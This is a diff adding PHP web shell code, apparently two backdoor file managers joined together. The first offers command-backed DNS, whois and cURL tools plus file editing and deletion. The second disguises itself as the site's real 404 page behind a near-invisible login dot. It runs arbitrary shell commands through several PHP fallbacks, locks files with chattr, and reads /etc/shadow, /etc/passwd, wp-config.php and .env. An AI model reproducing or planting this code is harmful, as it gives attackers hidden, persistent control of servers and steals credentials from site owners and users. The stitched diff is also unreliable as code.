+        case 'dnslookup': $dns_output = (isset($_POST['do_lookup'])) ? htmlspecialchars(exe("dig ".escapeshellarg($_POST['target_domain'])." ".escapeshellarg($_POST['record_type']))) : ''; echo '<h3>DNS Lookup (dig)</h3><form method="POST" action="?action=dnslookup&path='.urlencode($path).'"><p>Domain: <input type="text" name="target_domain" placeholder="google.com" required></p><p>Record Type: <select name="record_type"><option>A</option><option>MX</option><option>NS</option><option>TXT</option><option>ANY</option></select></p><input type="submit" name="do_lookup" value="Lookup"></form>'; if($dns_output) echo '<h4>Output:</h4><pre>'.$dns_output.'</pre>'; break;
+        case 'whois': $whois_output = (isset($_POST['do_whois'])) ? htmlspecialchars(exe("whois ".escapeshellarg($_POST['target_domain']))) : ''; echo '<h3>Whois Lookup</h3><form method="POST" action="?action=whois&path='.urlencode($path).'"><input type="text" name="target_domain" placeholder="google.com" required><input type="submit" name="do_whois" value="Whois"></form>'; if($whois_output) echo '<h4>Output:</h4><pre>'.$whois_output.'</pre>'; break;
+        case 'header': $header_output = ''; if (isset($_POST['get_header'])) { $url = $_POST['target_url']; if(filter_var($url, FILTER_VALIDATE_URL)) { $headers = get_headers($url, 1); $header_output = htmlspecialchars(print_r($headers, true)); } else { $header_output = 'URL tidak valid.'; } } echo '<h3>HTTP Header Viewer</h3><form method="POST" action="?action=header&path='.urlencode($path).'"><input type="text" name="target_url" placeholder="http://google.com" required style="width:calc(100% - 90px)"><input type="submit" name="get_header" value="Get Header"></form>'; if($header_output) echo '<h4>Output:</h4><pre>'.$header_output.'</pre>'; break;
+        case 'curl': echo '<h3>cURL Downloader</h3><form method="POST" action="?path='.urlencode($path).'"><p>URL File:<br><input type="text" name="url" placeholder="https://example.com/file.txt" required style="width:100%"></p><input type="submit" name="curl_download" value="Download ke Direktori Ini"></form>'; break;
+        case 'delete': echo '<h3>Konfirmasi Hapus: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><p style="color:red;text-align:center;">Anda YAKIN? Tindakan ini tidak bisa dibatalkan.</p><form method="POST" action="?option=true&path='.urlencode($path).'"><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="delete"><input type="submit" value="YA, HAPUS" style="background:red;color:white;"/> <a href="?path='.urlencode($path).'" style="margin-left:10px;">BATAL</a></form>'; break;
+        case 'extract_form': echo '<h3>Konfirmasi Ekstrak: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><p>Ekstrak semua isi file ini ke direktori saat ini ('.htmlspecialchars($path).')?</p><form method="POST" action="?option=true&path='.urlencode($path).'"><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="extract_save"><input type="submit" value="YA, EKSTRAK"/> <a href="?path='.urlencode($path).'" style="margin-left:10px;">BATAL</a></form>'; break;
+        case 'view_file': echo '<h3>Viewing: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><textarea style="width:100%;height:400px;" readonly>'.htmlspecialchars(@file_get_contents($_GET['target_file'])).'</textarea>'; break;
+        case 'edit_form': echo '<h3>Editing: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.urlencode($path).'"><textarea name="src_content" style="width:100%;height:400px;">'.htmlspecialchars(@file_get_contents($_GET['target_file'])).'</textarea><br><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="edit_save"><input type="submit" value="SAVE"/></form>'; break;
+        case 'rename_form': echo '<h3>Rename: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.urlencode($path).'">New Name: <input name="new_name_value" type="text" value="'.htmlspecialchars(basename($_GET['target_file'])).'"/><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="rename_save"><input type="submit" value="RENAME"/></form>'; break;
+        case 'chmod_form': $current_perms = substr(sprintf('%o', @fileperms($_GET['target_file'])), -4); echo '<h3>Chmod: '.htmlspecialchars(basename($_GET['target_file'])).'</h3><form method="POST" action="?option=true&path='.urlencode($path).'">Permission: <input name="perm_value" type="text" size="4" value="'.$current_perms.'"/><input type="hidden" name="path_target" value="'.htmlspecialchars($_GET['target_file']).'"><input type="hidden" name="opt_action" value="chmod_save"><input type="submit" value="CHMOD"/></form>'; break;
+    }
+    echo '</div>';
+}
+
+if ($show_file_list) {
+    echo '<form method="POST" action="?path='.urlencode($path).'">';
+    echo '<div id="content"><table><tr class="first"><th><input type="checkbox" onclick="document.querySelectorAll(\'.file-checkbox\').forEach(e=>e.checked=this.checked);"></th><th>Name</th><th>Size</th><th>Perm</th><th>Options</th></tr>';
+    $scandir_items = @scandir($path);
+    if ($scandir_items) {
+        usort($scandir_items, function($a, $b) use ($path) { if ($a == '..') return -1; if ($b == '..') return 1; if (is_dir($path.'/'.$a) && !is_dir($path.'/'.$b)) return -1; if (!is_dir($path.'/'.$a) && is_dir($path.'/'.$b)) return 1; return strcasecmp($a, $b); });
+        foreach($scandir_items as $item){
+            if($item == '.') continue;
+            $full_item_path = $path.DIRECTORY_SEPARATOR.$item;
+            $encoded_full_item_path = urlencode($full_item_path);
+            echo "<tr><td class='td_home' style='text-align:center;'>";
+            if ($item != '..') echo "<input type='checkbox' class='file-checkbox' name='selected_files[]' value='".htmlspecialchars($full_item_path)."'>";
+            echo "</td><td class='td_home' style='word-break:break-all;'>";
+            if($item == '..') echo "<i class='fa fa-folder-open-o'></i> <a href=\"?path=".urlencode(dirname($path))."\">".htmlspecialchars($item)."</a>";
+            elseif(is_dir($full_item_path)) echo "<i class='fa fa-folder-o'></i> <a href=\"?path=$encoded_full_item_path\">".htmlspecialchars($item)."</a>";
+            else echo "<i class='fa fa-file-o'></i> <a href=\"?action=view_file&target_file=$encoded_full_item_path&path=".urlencode($path)."\">".htmlspecialchars($item)."</a>";
+            echo "</td><td class='td_home' style='text-align:center;white-space:nowrap;'>".(is_file($full_item_path) ? round(@filesize($full_item_path)/1024,2).' KB' : '--')."</td>";
+            echo "<td class='td_home' style='text-align:center;'><font color='".(is_writable($full_item_path) ? '#57FF00' : (!is_readable($full_item_path) ? '#FF0004' : $theme_fg))."'>".perms($full_item_path)."</font></td>";
+            echo "<td class='td_home' style='text-align:center;'><select style='width:100px;' onchange=\"if(this.value) window.location.href='?action='+this.value+'&target_file={$encoded_full_item_path}&path=".urlencode($path)."'\"><option value=''>Action</option><option value='delete'>Delete</option>";
+            if(is_file($full_item_path)) { echo "<option value='edit_form'>Edit</option>"; if(class_exists('ZipArchive') && pathinfo($full_item_path, PATHINFO_EXTENSION) == 'zip') echo "<option value='extract_form'>Extract</option>"; }
+            echo "<option value='rename_form'>Rename</option><option value='chmod_form'>Chmod</option></select></td></tr>";
+        }
+    } else { echo "<tr><td colspan='5' style='text-align:center;'><font color='red'>Gagal membaca direktori.</font></td></tr>"; }
+    if (class_exists('ZipArchive')) {
+        echo '<tfoot><tr class="first"><td colspan="5">With selected: <select name="bulk_action"><option value="">Choose...</option><option value="zip_selected">Zip</option></select> <input type="submit" value="Go"></td></tr></tfoot>';
+    }
+    echo '</table></div></form>';
+}
+?>
+<hr style="border-top: 1px solid <?php echo $theme_border_color; ?>; width: 95%; max-width: 1200px; margin: 15px auto;">
+<center><font color="#fff" size="2px"><b>Coded With &#x1f497; by <font color="#de6f14"><?php echo htmlspecialchars($author); ?></font></b></center>
+</body>
+</html><?php
+// !!!!! HATA AYIKLAMA AÇIK - Çalışırsa sonra kapat !!!!!
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+ini_set('log_errors', 1);
+// !!!!! HATA AYIKLAMA SONU !!!!!
+
+# Konfigurasyon
+$SHELL_VERSION = "v8.0  ";
+$sayfaSifreleme ='0'; // 1: Açık, 0: Kapalı
+$kullaniciAdi = 'acc'; // DEĞİŞTİR BUNU AMK!
+$sifre = 'acc';      // BUNU DA DEĞİŞTİR!
+
+$LOGIN_USERNAME       = 'kampang26889';
+$LOGIN_PASSWORD_HASH  = '$2y$10$HFx7rStVQKzp6r82PNZwxOzzI.FP8y8KJBx7Sd58fPtDl5PHNLobG';
+
+// --- Oturum Yönetimi (Mesajlar için) ---
+if (session_status() == PHP_SESSION_NONE) { @session_start(); }
+
+// Fungsi untuk mengambil halaman 404 asli dari domain
+function getOriginal404Page() {
+    $protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
+    $host = $_SERVER['HTTP_HOST'];
+    
+    $random_path = '/404-' . md5(rand() . time() . uniqid()) . '.html';
+    $url = $protocol . '://' . $host . $random_path;
+    
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
+        $response = curl_exec($ch);
+        $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+        curl_close($ch);
+        
+        if ($http_code == 404 && !empty($response)) {
+            return $response;
+        }
+    }
+    return false;
+}
+
+function injectLoginButton($html) {
+    $login_html = '
+    <div style="position:fixed;top:8px;right:8px;width:4px;height:4px;background:rgba(255,255,255,0.08);border-radius:50%;cursor:pointer;z-index:9999;transition:all 0.2s;" onmouseover="this.style.background=\'rgba(255,0,60,0.5)\';this.style.boxShadow=\'0 0 5px #ff003c\'" onmouseout="this.style.background=\'rgba(255,255,255,0.08)\';this.style.boxShadow=\'none\'" onclick="showLoginModal()"></div>
+    
+    <!-- Modal Login Cyber Glassmorphism -->
+    <div id="loginModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);z-index:10000;align-items:center;justify-content:center;">
+        <div style="background:rgba(10,10,10,0.95);backdrop-filter:blur(15px);-webkit-backdrop-filter:blur(15px);padding:35px 40px;border-radius:12px;width:360px;box-shadow:0 0 30px rgba(255,0,60,0.3),0 0 15px rgba(0,255,255,0.2);text-align:center;border:1px solid rgba(255,0,60,0.5);">
+            <div style="margin-bottom:20px;">
+                <i class="fas fa-skull" style="font-size:48px;color:#ff003c;text-shadow:0 0 10px #ff003c;"></i>
+            </div>
+            <h3 style="margin:0 0 25px 0;font-size:22px;font-weight:500;color:#00ffff;letter-spacing:2px;text-shadow:0 0 10px #00ffff;">ACCESS RESTRICTED</h3>
+            <form method="post" id="secretLoginForm">
+                <div style="position:relative;margin-bottom:20px;">
+                    <i class="fas fa-user" style="position:absolute;left:12px;top:12px;color:#ff003c;"></i>
+                    <input type="text" name="secret_login_user" placeholder="USERNAME" style="width:100%;padding:12px 12px 12px 35px;border:1px solid rgba(255,0,60,0.5);border-radius:6px;box-sizing:border-box;font-size:14px;background:rgba(0,0,0,0.6);color:#00ff00;outline:none;transition:all 0.3s;font-family:monospace;">
+                </div>
+                <div style="position:relative;margin-bottom:25px;">
+                    <i class="fas fa-lock" style="position:absolute;left:12px;top:12px;color:#ff003c;"></i>
+                    <input type="password" name="secret_login_pass" placeholder="PASSWORD" style="width:100%;padding:12px 12px 12px 35px;border:1px solid rgba(255,0,60,0.5);border-radius:6px;box-sizing:border-box;font-size:14px;background:rgba(0,0,0,0.6);color:#00ff00;outline:none;transition:all 0.3s;font-family:monospace;">
+                </div>
+                <button type="submit" style="width:100%;padding:12px;background:linear-gradient(135deg,#ff003c,#cc0030);color:#000;border:none;border-radius:6px;margin-top:5px;cursor:pointer;font-size:14px;font-weight:bold;letter-spacing:2px;transition:all 0.3s;text-transform:uppercase;">AUTHENTICATE</button>
+            </form>
+            <div style="text-align:center;margin-top:20px;font-size:12px;color:rgba(255,255,255,0.3);cursor:pointer;font-family:monospace;" onclick="closeLoginModal()">[ SYSTEM LOCK ]</div>
+        </div>
+    </div>
+    
+    <style>
+        #secretLoginForm input:focus {
+            border-color: #00ffff;
+            box-shadow: 0 0 10px rgba(0,255,255,0.3);
+        }
+        #secretLoginForm button:hover {
+            background: linear-gradient(135deg,#ff3366,#ff003c);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 20px rgba(255,0,60,0.4);
+        }
+        #loginModal > div {
+            animation: cyberFadeIn 0.3s ease-out;
+        }
+        @keyframes cyberFadeIn {
+            from {
+                opacity: 0;
+                transform: scale(0.9) translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: scale(1) translateY(0);
+            }
+        }
+    </style>
+    
+    <script>
+        function showLoginModal() {
+            document.getElementById("loginModal").style.display = "flex";
+        }
+        function closeLoginModal() {
+            document.getElementById("loginModal").style.display = "none";
+        }
+        window.onclick = function(event) {
+            var modal = document.getElementById("loginModal");
+            if (event.target == modal) {
+                modal.style.display = "none";
+            }
+        }
+        document.addEventListener("keydown", function(e) {
+            if (e.key === "Escape") {
+                closeLoginModal();
+            }
+        });
+    </script>
+    </body>';
+    
+    $html = str_replace('</body>', $login_html, $html);
+    if (strpos($html, '</body>') === false) {
+        $html .= $login_html;
+    }
+    
+    return $html;
+}
+
+// Fungsi untuk menampilkan halaman 404 custom dengan login
+function show404WithLogin() {
+    $original_404 = getOriginal404Page();
+    
+    if ($original_404 !== false) {
+        $html = injectLoginButton($original_404);
+        header('HTTP/1.1 404 Not Found');
+        echo $html;
+        exit;
+    }
+    
+    // Fallback 404 custom dengan TITIK TERSAMARKAN
+    header('HTTP/1.1 404 Not Found');
+    ?>
+    <!DOCTYPE html>
+    <html>
+    <head>
+        <title>404 Not Found</title>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+        <style>
+            @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&display=swap');
+            body { font-family: 'Fira Code', monospace; background: #0a0a0a; margin: 0; padding: 0; min-height: 100vh; }
+            .container { max-width: 800px; margin: 80px auto; text-align: center; padding: 40px; background: rgba(10,10,10,0.8); border: 1px solid #ff003c; border-radius: 12px; box-shadow: 0 0 50px rgba(255,0,60,0.2); }
+            h1 { font-size: 72px; color: #ff003c; text-shadow: 0 0 20px #ff003c; margin: 0; font-weight: bold; }
+            hr { border: none; border-top: 1px solid #ff003c; margin: 20px 0; box-shadow: 0 0 10px #ff003c; }
+            .message { font-size: 16px; color: #00ff00; }
+            .fa-skull { font-size: 48px; color: #ff003c; margin-bottom: 20px; text-shadow: 0 0 10px #ff003c; }
+        </style>
+    </head>
+    <body>
+        <div class="container">
+            <i class="fas fa-skull"></i>
+            <h1>404</h1>
+            <hr>
+            <div class="message">[ ERROR: REQUESTED RESOURCE NOT FOUND ]</div>
+            <div class="message"><?php echo htmlspecialchars($_SERVER['REQUEST_URI']); ?></div>
+        </div>
+        
+        <!-- TITIK TERSAMARKAN - Hampir tidak terlihat (pojok kanan atas) -->
+        <div style="position:fixed;top:8px;right:8px;width:4px;height:4px;background:rgba(255,255,255,0.08);border-radius:50%;cursor:pointer;z-index:9999;transition:all 0.2s;" onmouseover="this.style.background='rgba(255,0,60,0.5)';this.style.boxShadow='0 0 5px #ff003c'" onmouseout="this.style.background='rgba(255,255,255,0.08)';this.style.boxShadow='none'" onclick="showLoginModal()"></div>
+        
+        <!-- Modal Login Cyber -->
+        <div id="loginModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.85);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);z-index:10000;align-items:center;justify-content:center;">
+            <div style="background:rgba(10,10,10,0.95);backdrop-filter:blur(15px);-webkit-backdrop-filter:blur(15px);padding:35px 40px;border-radius:12px;width:360px;box-shadow:0 0 30px rgba(255,0,60,0.3);text-align:center;border:1px solid rgba(255,0,60,0.5);">
+                <i class="fas fa-terminal" style="font-size:48px;color:#00ffff;text-shadow:0 0 10px #00ffff;"></i>
+                <h3 style="margin:20px 0;font-size:20px;color:#ff003c;text-shadow:0 0 10px #ff003c;">AUTHENTICATION REQUIRED</h3>
+                <form method="post">
+                    <input type="text" name="secret_login_user" placeholder="USERNAME" style="width:100%;padding:12px;margin:10px 0;border:1px solid #ff003c;border-radius:6px;background:rgba(0,0,0,0.6);color:#00ff00;outline:none;font-family:monospace;">
+                    <input type="password" name="secret_login_pass" placeholder="PASSWORD" style="width:100%;padding:12px;margin:10px 0;border:1px solid #ff003c;border-radius:6px;background:rgba(0,0,0,0.6);color:#00ff00;outline:none;font-family:monospace;">
+                    <button type="submit" style="width:100%;padding:12px;background:#ff003c;color:#000;border:none;border-radius:6px;margin-top:15px;cursor:pointer;font-weight:bold;">LOGIN</button>
+                </form>
+                <div style="margin-top:15px;font-size:12px;color:#555;cursor:pointer;" onclick="document.getElementById('loginModal').style.display='none'">[ CLOSE ]</div>
+            </div>
+        </div>
+        
+        <style>
+            #loginModal input:focus { border-color: #00ffff; box-shadow: 0 0 10px #00ffff; }
+            #loginModal button:hover { background: #ff3366; transform: scale(1.02); }
+            #loginModal > div { animation: fadeInScale 0.2s ease-out; }
+            @keyframes fadeInScale {
+                from { opacity: 0; transform: scale(0.95); }
+                to { opacity: 1; transform: scale(1); }
+            }
+        </style>
+        
+        <script>
+            function showLoginModal() { 
+                document.getElementById('loginModal').style.display = 'flex'; 
+            }
+            window.onclick = function(e) { 
+                var modal = document.getElementById('loginModal');
+                if (e.target == modal) {
+                    modal.style.display = 'none';
+                }
+            }
+        </script>
+    </body>
+    </html>
+    <?php
+    exit;
+}
+
+// ====================== FUNGSI LOGIN CHECK ======================
+function requireLogin() {
+    global $LOGIN_USERNAME, $LOGIN_PASSWORD_HASH;
+
+    // Cek login via POST
+    if (isset($_POST['secret_login_user']) && isset($_POST['secret_login_pass'])) {
+        $u = $_POST['secret_login_user'];
+        $p = $_POST['secret_login_pass'];
+
+        if ($u === $LOGIN_USERNAME && password_verify($p, $LOGIN_PASSWORD_HASH)) {
+            $_SESSION['logged_in'] = true;
+            header('Location: ' . $_SERVER['PHP_SELF']);
+            exit;
+        } else {
+            // Login gagal - tetap tampilkan 404
+            $_SESSION['login_failed'] = true;
+        }
+    }
+
+    // Jika belum login atau gagal login, tampilkan 404
+    if (!isset($_SESSION['logged_in']) || $_SESSION['logged_in'] !== true) {
+        show404WithLogin();
+    }
+}
+
+// Panggil fungsi login di AWAL (sebelum konten apapun)
+requireLogin();
+
+# --- Yetki Kontrolü (Basic Auth opsional) ---
+function yetkiKontrol($kullaniciAdi, $sifre) { global $sayfaSifreleme; if($sayfaSifreleme =='1') { if(empty($_SERVER['PHP_AUTH_USER']) || empty($_SERVER['PHP_AUTH_PW']) || $_SERVER['PHP_AUTH_USER'] != $kullaniciAdi || $_SERVER['PHP_AUTH_PW'] != $sifre) { header('WWW-Authenticate: Basic realm=" - ACCESS DENIED"'); header('HTTP/1.0 401 Unauthorized'); die('<!DOCTYPE html><html><head><title>ACCESS DENIED</title><body style="background:#000; color:#f00; font-family:monospace; text-align:center;"><h1>ACCESS DENIED!</h1></body></html>'); } } }
+yetkiKontrol($kullaniciAdi, $sifre);
+
+// --- Temel Helper Fonksiyonlar ---
+function formatSizeUnits($bytes) { if ($bytes === false || $bytes === null) return '???'; if ($bytes >= 1073741824) { $bytes = number_format($bytes / 1073741824, 2) . ' GB'; } elseif ($bytes >= 1048576) { $bytes = number_format($bytes / 1048576, 2) . ' MB'; } elseif ($bytes >= 1024) { $bytes = number_format($bytes / 1024, 2) . ' KB'; } elseif ($bytes > 1) { $bytes = $bytes . ' bytes'; } elseif ($bytes == 1) { $bytes = $bytes . ' byte'; } else { $bytes = '0 bytes'; } return $bytes; }
+function fileExtension($file) { $file = rtrim($file, '/'); $pos = strrpos($file, '.'); if ($pos === false) { return ''; } return substr($file, $pos + 1); }
+function perms_to_string($perms) {
+    if ($perms === false || $perms === null) return '????';
+    $info = '';
+    if (($perms & 0xC000) == 0xC000) $info = 's';
+    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
+    elseif (($perms & 0x8000) == 0x8000) $info = '-';
+    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
+    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
+    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
+    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
+    else $info = 'u';
+    $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-'));
+    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-'));
+    $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-'));
+    return $info;
+}
+function encodePath($path) { return str_replace(array('/', '\\'), array('__SLASH__', '__BSLASH__'), $path); }
+function decodePath($path) { return str_replace(array('__SLASH__', '__BSLASH__'), array('/', '\\'), $path); }
+function runCommand($cmd) { $output = ''; $error = ''; $ret_val = -1; if (function_exists('shell_exec')) { $output = shell_exec($cmd . ' 2>&1'); } elseif (function_exists('system')) { ob_start(); system($cmd . ' 2>&1', $ret_val); $output = ob_get_contents(); ob_end_clean(); } elseif (function_exists('passthru')) { ob_start(); passthru($cmd . ' 2>&1', $ret_val); $output = ob_get_contents(); ob_end_clean(); } elseif (function_exists('exec')) { exec($cmd . ' 2>&1', $output_array, $ret_val); $output = implode("\n", $output_array); } elseif (function_exists('proc_open')) { $descriptorspec = array( 0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w") ); $process = proc_open($cmd, $descriptorspec, $pipes); if (is_resource($process)) { fclose($pipes[0]); $output = stream_get_contents($pipes[1]); fclose($pipes[1]); $error = stream_get_contents($pipes[2]); fclose($pipes[2]); $ret_val = proc_close($process); if (!empty($error)) $output .= "\nSTDERR:\n" . $error; } else { $output = "proc_open failed."; } } else { $output = "Command execution functions are disabled."; } return array('output' => htmlspecialchars(trim($output)), 'retval' => $ret_val); }
+
+// --- PATH Belirleme ---
+$script_path = dirname(__FILE__); $doc_root = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : $script_path; $current_path = $script_path;
+if (isset($_GET['p'])) { $decoded_p = decodePath($_GET['p']); $resolved_path = @realpath($decoded_p); if ($resolved_path !== false && @is_readable($resolved_path)) { $current_path = $resolved_path; } elseif (@file_exists($decoded_p) && @is_readable($decoded_p)) { $current_path = $decoded_p; } else { $current_path = $script_path; $_SESSION['message'] = 'Geçersiz veya okunamayan yol!'; $_SESSION['message_type'] = 'error'; } }
+$current_path = str_replace('\\', '/', $current_path); if ($current_path !== '/') { $current_path = rtrim($current_path, '/'); } if (empty($current_path)) { $current_path = '/'; }
+define("PATH", $current_path);
+
+// --- İkon Fonksiyonu ---
+function fileIcon($file) { $full_path = PATH . '/' . $file; $imgs = array("apng", "avif", "gif", "jpg", "jpeg", "jfif", "pjpeg", "pjp", "png", "svg", "webp", "ico"); $audio = array("wav", "m4a", "m4b", "mp3", "ogg", "webm", "mpc", "flac"); $video = array("mp4", "mov", "avi", "mkv", "webm", "flv", "wmv"); $code = array("php", "phtml", "html", "htm", "css", "js", "py", "sh", "json", "xml", "sql", "c", "cpp", "java", "rb", "go", "swift", "kt", "tpl", "ini", "conf"); $archive = array("zip", "rar", "tar", "gz", "7z", "bz2", "xz"); $doc = array("pdf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "odt", "ods", "odp"); $ext = strtolower(fileExtension($file)); if (@is_dir($full_path)) return '<i class="fas fa-folder-open hacker-icon-folder"></i> '; if ($file == "error_log") return '<i class="fas fa-bug hacker-icon-error"></i> '; if ($file == ".htaccess" || $file == ".htpasswd" || $file == "config" || strpos($file, '.conf') !== false || strpos($file, '.ini') !== false) return '<i class="fas fa-cogs hacker-icon-config"></i> '; if (in_array($ext, $code)) return '<i class="fas fa-code hacker-icon-code"></i> '; if (in_array($ext, $imgs)) return '<i class="fas fa-file-image hacker-icon-image"></i> '; if (in_array($ext, $audio)) return '<i class="fas fa-file-audio hacker-icon-audio"></i> '; if (in_array($ext, $video)) return '<i class="fas fa-file-video hacker-icon-video"></i> '; if (in_array($ext, $archive)) return '<i class="fas fa-file-archive hacker-icon-archive"></i> '; if (in_array($ext, $doc)) return '<i class="fas fa-file-pdf hacker-icon-doc"></i> '; if ($ext == "txt" || $ext == "md" || $ext == "log") return '<i class="fas fa-file-alt hacker-icon-text"></i> '; return '<i class="fas fa-file hacker-icon-default"></i> '; }
+
+// --- POST ve GET İşlemleri ---
+$message = isset($_SESSION['message']) ? $_SESSION['message'] : ''; $message_type = isset($_SESSION['message_type']) ? $_SESSION['message_type'] : ''; unset($_SESSION['message'], $_SESSION['message_type']);
+$action_result_output = '';
+
+// GET İşlemleri
+if ($_SERVER['REQUEST_METHOD'] === 'GET') { 
+    if (isset($_GET['chmod']) && isset($_GET['file'])) { $file_to_chmod = PATH . '/' . urldecode($_GET['file']); $new_perm = intval($_GET['chmod'], 8); if (file_exists($file_to_chmod)) { if (@chmod($file_to_chmod, $new_perm)) { $_SESSION['message'] = 'Perms set to ' . sprintf('%o', $new_perm) . '!'; $_SESSION['message_type'] = 'success'; } else { $_SESSION['message'] = 'Error: Chmod failed!'; $_SESSION['message_type'] = 'error'; } } else { $_SESSION['message'] = 'Error: File not found!'; $_SESSION['message_type'] = 'error'; } header('Location: ?p=' . urlencode(encodePath(PATH))); exit; } 
+    if (isset($_GET['chattr']) && isset($_GET['file'])) { $file_to_chattr = PATH . '/' . urldecode($_GET['file']); $attr_cmd = $_GET['chattr'] == 'lock' ? '+i' : '-i'; $command = "chattr " . $attr_cmd . " " . escapeshellarg($file_to_chattr); $cmd_result = runCommand($command); if (stripos($cmd_result['output'], 'Operation not permitted') === false && stripos($cmd_result['output'], 'No such file') === false && stripos($cmd_result['output'], 'command not found') === false && $cmd_result['retval'] <= 1) { $_SESSION['message'] = 'chattr ' . $attr_cmd . ' attempted.'; $_SESSION['message_type'] = 'success'; } else { $_SESSION['message'] = 'Error: chattr failed: ' . $cmd_result['output']; $_SESSION['message_type'] = 'error'; } header('Location: ?p=' . urlencode(encodePath(PATH))); exit; } 
+    if (isset($_GET['d']) && isset($_GET['file'])) { $item_to_delete = urldecode($_GET['file']); $item_path = PATH . "/" . $item_to_delete; $success = false; $error_msg = 'Unknown error!'; if (!file_exists($item_path)) { $error_msg = 'Item not found!'; } elseif (is_file($item_path)) { if (@unlink($item_path)) { $success = true; $msg = 'File deleted!'; } else { $error_msg = 'File deletion failed!'; } } elseif (is_dir($item_path)) { if (@rmdir($item_path)) { $success = true; $msg = 'Directory deleted (empty)!'; } else { $error_msg = 'Directory deletion failed (not empty/perms)!'; } } if ($success) { $_SESSION['message'] = $msg; $_SESSION['message_type'] = 'success'; } else { $_SESSION['message'] = 'Error: ' . $error_msg; $_SESSION['message_type'] = 'error'; } header('Location: ?p=' . urlencode(encodePath(PATH))); exit; } 
+    if (isset($_GET['dl']) && isset($_GET['file'])) { $file_to_download = urldecode($_GET['file']); $file_path = PATH . "/" . $file_to_download; if (!is_file($file_path)) { $_SESSION['message']='Error: Not a file!'; $_SESSION['message_type']='error'; header('Location: ?p=' . urlencode(encodePath(PATH))); exit; } elseif (!is_readable($file_path)) { $_SESSION['message']='Error: Cannot read file!'; $_SESSION['message_type']='error'; header('Location: ?p=' . urlencode(encodePath(PATH))); exit; } else { header('Content-Description: File Transfer'); header('Content-Type: application/octet-stream'); header('Content-Disposition: attachment; filename="' . basename($file_path) . '"'); header('Expires: 0'); header('Cache-Control: must-revalidate'); header('Pragma: public'); header('Content-Length: ' . filesize($file_path)); @ob_clean(); @flush(); @readfile($file_path); exit; } } 
+    if (isset($_GET['read_config'])) { $config_file = ''; $common_configs = array( 'passwd' => '/etc/passwd', 'shadow' => '/etc/shadow', 'wpconfig' => PATH . '/wp-config.php', 'wpconfig_up' => dirname(PATH) . '/wp-config.php', 'env' => PATH . '/.env', 'env_up' => dirname(PATH) . '/.env', 'apache_conf' => '/etc/apache2/apache2.conf', 'nginx_conf' => '/etc/nginx/nginx.conf', 'php_ini' => php_ini_loaded_file() ?: '/etc/php/php.ini' ); if (isset($common_configs[$_GET['read_config']])) { $config_file = $common_configs[$_GET['read_config']]; } $config_content = @file_get_contents($config_file); if ($config_content !== false) { $action_result_output = "--- Content of " . htmlspecialchars($config_file) . " ---\n\n" . htmlspecialchars($config_content); } elseif (!empty($config_file)) { $action_result_output = "Error: Cannot read " . htmlspecialchars($config_file); } else { $action_result_output = "Error: Unknown config file requested."; } } 
+}
+
+// POST İşlemleri
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
